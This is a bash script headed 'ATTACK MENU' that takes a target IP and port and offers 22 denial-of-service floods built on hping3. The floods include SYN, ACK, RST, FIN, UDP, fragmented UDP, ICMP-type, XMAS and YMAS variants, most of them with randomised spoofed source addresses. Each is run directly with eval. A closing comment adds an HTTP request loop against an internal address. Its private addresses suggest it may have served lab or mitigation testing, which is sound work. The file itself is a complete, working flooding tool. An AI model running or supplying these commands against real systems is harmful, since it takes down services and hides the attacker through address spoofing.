#!/usr/bin/bash

hping='/usr/sbin/hping3'

echo "*** ATTACK MENU ***"
echo "******************"
echo ""
#IP="10.128.10.50"
IP=$1
if [ "$IP" == "" ]
 then
        echo "Enter Target IP as an Argument"
        exit
fi

PORT=$2
if [ "$PORT" == "" ]
 then
        echo "Enter Target PORT as an Argument"
        exit
fi

echo "Target: $IP:$PORT"
echo ""
#PORT="80"
ATTACK='Please enter your choice: '
options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-TS" "SYN/ACK-Flood" "SYN/ACK-TS-Flood" "ICMP-Flood" "vol-ICMP-Flood" "ACK-Flood" "ACK-Flood-TS" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "vol_UDP-Flood" "frag-UDP-Flood" "BN1" "BN2" "BN3" "BN4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "SYN-Flood")
                cmd="$hping -i u1 -S --rand-source -p $PORT $IP --tos 21 --ttl 33 -d 99"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "PUSH-Flood")
                cmd="$hping -P -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Push/Ack-Flood")
                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Push/Ack-Flood-TS")
		cmd="$hping -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 33 --ttl 74 -d 54"
		echo "Running: "$cmd
                eval $cmd
                ;;
	"SYN/ACK-Flood")
		cmd="$hping -SA -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54"
		echo "Running: "$cmd
                eval $cmd
		;;	
	"SYN/ACK-TS-Flood")
		cmd="$hping -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54"
		echo "Running: "$cmd
                eval $cmd
		;;
        "ICMP-Flood")
                cmd="$hping --icmp -i u1 $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "vol-ICMP-Flood")
                cmd="$hping --icmp -i u1 -d 1300 $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tos 27 --ttl 122 -d 99"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood-TS")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 122 -d 99"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood-single_source")
                cmd="$hping --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 27 --ttl 122 -d 99"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "RST-Flood")
		cmd="$hping --rst -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "FIN-Flood")
                cmd="$hping --fin -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "UDP-Flood")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "vol_UDP-Flood")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source --data 1400"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "frag-UDP-Flood")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source -x"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BN1")
                cmd="$hping --icmp -C 3 -K 0 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BN2")
                cmd="$hping --icmp -C 3 -K 3 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BN3")
                cmd="$hping --icmp -C 8 -K 0 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BN4")
                cmd="$hping --icmp -C 8 -K 3 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "X-MAS-Flood")
                cmd="$hping --xmas -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Y-MAS-Flood")
                cmd="$hping --ymas -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
# for i in {1..5000}; do curl -v --header "Host: whatever" http://10.128.10.80/whatever$i; done
